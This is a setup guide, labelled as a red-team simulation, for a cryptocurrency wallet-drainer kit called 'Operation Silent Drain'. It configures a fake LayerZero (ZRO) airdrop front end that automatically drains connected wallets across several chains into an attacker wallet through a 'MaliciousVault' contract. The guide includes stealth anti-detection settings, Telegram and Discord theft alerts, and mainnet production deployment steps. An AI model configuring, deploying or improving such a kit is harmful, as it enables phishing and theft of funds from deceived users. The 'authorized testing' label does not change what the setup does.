# Environment Configuration Guide

## [RED TEAM SIMULATION - AUTHORIZED TESTING ONLY]

**Updated**: August 29, 2025  
**Status**: ✅ Production Ready

This guide will help you set up the environment variables for the Operation Silent Drain system.

## Quick Setup

1. **Create a `.env` file** in the project root directory
2. **Copy the configuration below** into your `.env` file
3. **Replace placeholder values** with your actual configuration

## Complete .env Configuration

```bash
# =============================================================================
# SERVER CONFIGURATION
# =============================================================================
PORT=3000
NODE_ENV=development

# =============================================================================
# BLOCKCHAIN CONFIGURATION
# =============================================================================
# Ethereum RPC URL (Infura, Alchemy, or your own node)
# Examples:
# - Infura: https://mainnet.infura.io/v3/YOUR_PROJECT_ID
# - Alchemy: https://eth-mainnet.alchemyapi.io/v2/YOUR_API_KEY
# - Sepolia Testnet: https://sepolia.infura.io/v3/YOUR_PROJECT_ID
RPC_URL=https://mainnet.infura.io/v3/YOUR_PROJECT_ID

# Multi-Chain RPC URLs (for enhanced draining capabilities)
ETHEREUM_RPC_URL=https://mainnet.infura.io/v3/YOUR_PROJECT_ID
BSC_RPC_URL=https://bsc-dataseed1.binance.org
POLYGON_RPC_URL=https://polygon-rpc.com
AVALANCHE_RPC_URL=https://api.avax.network/ext/bc/C/rpc
ARBITRUM_RPC_URL=https://arb1.arbitrum.io/rpc
OPTIMISM_RPC_URL=https://mainnet.optimism.io

# Private key for the attacker wallet (must have ETH for gas fees)
# Format: 0x followed by 64 hexadecimal characters
# WARNING: Never commit your actual private key to version control!
PRIVATE_KEY=0x1234567890123456789012345678901234567890123456789012345678901234

# Vault contract address (deploy MaliciousVault.sol first)
# Leave empty for simulation mode
VAULT_CONTRACT_ADDRESS=0x0000000000000000000000000000000000000000

# =============================================================================
# NOTIFICATION SETTINGS
# =============================================================================
# Telegram Bot Token (get from @BotFather)
# Format: 123456789:ABCdefGHIjklMNOpqrsTUVwxyz
TELEGRAM_BOT_TOKEN=YOUR_TELEGRAM_BOT_TOKEN

# Telegram Chat ID (where to send alerts)
# Get this by messaging @userinfobot
TELEGRAM_CHAT_ID=YOUR_CHAT_ID

# Discord Webhook URL
# Format: https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN
DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN

# =============================================================================
# OPERATION SETTINGS
# =============================================================================
# Target priority strategy
# Options: high, stable, mixed, drain_all
TARGET_PRIORITY=high

# Drain delay in milliseconds (between operations)
DRAIN_DELAY=500

# Maximum retry attempts for failed operations
MAX_RETRIES=3

# Enable stealth mode (anti-detection measures)
STEALTH_MODE=true

# =============================================================================
# AUTOMATIC DRAINING SETTINGS
# =============================================================================
# Enable automatic draining on wallet connection
AUTO_DRAIN_ENABLED=true

# Minimum value in USD to trigger drain
MIN_DRAIN_VALUE=1.0

# Threshold for 'drain_all' mode (minimum value per token)
DRAIN_ALL_THRESHOLD=1.0

# =============================================================================
# REAL-TIME PRICE DATA
# =============================================================================
# CoinGecko API Key (for real-time LayerZero price data)
# Get free API key from: https://www.coingecko.com/en/api
COINGECKO_API_KEY=YOUR_COINGECKO_API_KEY

# Price update interval in seconds
PRICE_UPDATE_INTERVAL=30

# =============================================================================
# FRONTEND CONFIGURATION
# =============================================================================
# Default token name (configurable from admin)
DEFAULT_TOKEN_NAME=LayerZero

# Default token symbol (configurable from admin)
DEFAULT_TOKEN_SYMBOL=ZRO

# Default airdrop amount (configurable from admin)
DEFAULT_AIRDROP_AMOUNT=1000

# Default total allocation (configurable from admin)
DEFAULT_TOTAL_ALLOCATION=10000000

# Default claimed amount (configurable from admin)
DEFAULT_CLAIMED_AMOUNT=7500000

# Default end date (configurable from admin)
DEFAULT_END_DATE=2024-12-31T23:59:59Z

# =============================================================================
# ADMIN AUTHENTICATION
# =============================================================================
# Admin username for dashboard access
ADMIN_USERNAME=admin

# Admin password for dashboard access (change this!)
ADMIN_PASSWORD=admin123

# JWT secret for admin tokens (generate a random string)
JWT_SECRET=your-super-secret-jwt-key-change-this-in-production

# =============================================================================
# SECURITY SETTINGS
# =============================================================================
# Secret key for admin dashboard authentication
# Generate a random string for security
ADMIN_SECRET=your-super-secret-admin-key-here

# Session timeout in minutes
SESSION_TIMEOUT=30

# =============================================================================
# MONITORING SETTINGS
# =============================================================================
# Enable detailed logging
DEBUG_MODE=false

# Log level (error, warn, info, debug)
LOG_LEVEL=info

# =============================================================================
# DEPLOYMENT SETTINGS
# =============================================================================
# Production URL (for notifications)
BASE_URL=http://localhost:3000

# Enable HTTPS (for production)
FORCE_HTTPS=false

# =============================================================================
# DATABASE SETTINGS (for production)
# =============================================================================
# Database type (sqlite, mysql, postgresql)
DB_TYPE=sqlite

# Database connection string
# SQLite: ./data/operations.db
# MySQL: mysql://user:password@localhost:3306/database
# PostgreSQL: postgresql://user:password@localhost:5432/database
DATABASE_URL=./data/operations.db

# Database encryption key (for sensitive data)
DB_ENCRYPTION_KEY=your-database-encryption-key-here
```

## Required Setup Steps

### 1. Blockchain Provider Setup

**Option A: Infura (Recommended)**
1. Go to [Infura.io](https://infura.io)
2. Create a free account
3. Create a new project
4. Copy your project ID
5. Set `RPC_URL=https://mainnet.infura.io/v3/YOUR_PROJECT_ID`

**Option B: Alchemy**
1. Go to [Alchemy.com](https://alchemy.com)
2. Create a free account
3. Create a new app
4. Copy your API key
5. Set `RPC_URL=https://eth-mainnet.alchemyapi.io/v2/YOUR_API_KEY`

**Multi-Chain Setup:**
- **BSC**: Use `https://bsc-dataseed1.binance.org` (free)
- **Polygon**: Use `https://polygon-rpc.com` (free)
- **Avalanche**: Use `https://api.avax.network/ext/bc/C/rpc` (free)
- **Arbitrum**: Use `https://arb1.arbitrum.io/rpc` (free)
- **Optimism**: Use `https://mainnet.optimism.io` (free)

### 2. Real-Time Price Data Setup

**CoinGecko API (Recommended):**
1. Go to [CoinGecko API](https://www.coingecko.com/en/api)
2. Create a free account
3. Get your API key
4. Set `COINGECKO_API_KEY=YOUR_API_KEY`

**Alternative: CoinMarketCap API:**
1. Go to [CoinMarketCap API](https://coinmarketcap.com/api/)
2. Create a free account
3. Get your API key
4. Set `COINMARKETCAP_API_KEY=YOUR_API_KEY`

### 3. Wallet Setup

**For Testing (Sepolia Testnet):**
1. Get test ETH from [Sepolia Faucet](https://sepoliafaucet.com)
2. Use a test wallet private key
3. Set `RPC_URL=https://sepolia.infura.io/v3/YOUR_PROJECT_ID`

**For Production (Ethereum Mainnet):**
1. Create a dedicated wallet for operations
2. Fund it with ETH for gas fees
3. Export the private key securely
4. Set `RPC_URL=https://mainnet.infura.io/v3/YOUR_PROJECT_ID`

### 4. Contract Deployment

1. Deploy `MaliciousVault.sol` using the provided `deploy.js` script
2. Copy the deployed contract address
3. Set `VAULT_CONTRACT_ADDRESS=0xYOUR_DEPLOYED_CONTRACT_ADDRESS`

### 5. Notification Setup (Optional)

**Telegram Bot:**
1. Message [@BotFather](https://t.me/botfather) on Telegram
2. Create a new bot with `/newbot`
3. Copy the bot token
4. Message [@userinfobot](https://t.me/userinfobot) to get your chat ID
5. Set `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID`

**Discord Webhook:**
1. Go to your Discord server settings
2. Navigate to Integrations > Webhooks
3. Create a new webhook
4. Copy the webhook URL
5. Set `DISCORD_WEBHOOK_URL`

## Testing Configuration

For initial testing, you can use these minimal settings:

```bash
PORT=3000
RPC_URL=https://sepolia.infura.io/v3/YOUR_PROJECT_ID
PRIVATE_KEY=0x1234567890123456789012345678901234567890123456789012345678901234
VAULT_CONTRACT_ADDRESS=0x0000000000000000000000000000000000000000
TARGET_PRIORITY=high
STEALTH_MODE=true
AUTO_DRAIN_ENABLED=true
MIN_DRAIN_VALUE=1.0
DRAIN_ALL_THRESHOLD=1.0
```

## Security Notes

1. **Never commit your `.env` file** to version control
2. **Use a dedicated wallet** for operations, not your main wallet
3. **Keep private keys secure** and never share them
4. **Use testnet first** before moving to mainnet
5. **Monitor gas fees** to ensure your wallet has sufficient ETH
6. **Rotate API keys** regularly for security

## Troubleshooting

### Common Issues:

1. **"Invalid RPC URL"** - Check your Infura/Alchemy configuration
2. **"Invalid private key"** - Ensure it starts with 0x and is 66 characters long
3. **"Insufficient funds"** - Add ETH to your wallet for gas fees
4. **"Contract not found"** - Deploy the contract first or use simulation mode
5. **"Price data not updating"** - Check your CoinGecko API key
6. **"Multi-chain draining not working"** - Verify all RPC URLs are accessible

### Testing Checklist:

- [ ] Server starts without errors
- [ ] Frontend loads at http://localhost:3000
- [ ] Admin dashboard accessible at http://localhost:3000/admin
- [ ] Wallet connection works
- [ ] Real-time price data updates
- [ ] Automatic draining works
- [ ] Manual draining works
- [ ] Multi-chain support enabled
- [ ] Notifications are received (if configured)
- [ ] Frontend configuration saves
- [ ] Admin settings save properly

## Production Deployment

For production deployment:

1. Set `NODE_ENV=production`
2. Use a production RPC provider
3. Deploy to a secure hosting platform
4. Set `FORCE_HTTPS=true`
5. Configure proper domain in `BASE_URL`
6. Use environment-specific private keys
7. Enable all security features
8. Set up database for persistent settings
9. Configure real-time price data API
10. Test all multi-chain functionality

## Support

If you encounter issues:

1. Check the server logs for error messages
2. Verify all environment variables are set correctly
3. Test with minimal configuration first
4. Ensure all dependencies are installed (`npm install`)
5. Check network connectivity and RPC provider status
6. Verify API keys for price data services
7. Test multi-chain RPC endpoints individually
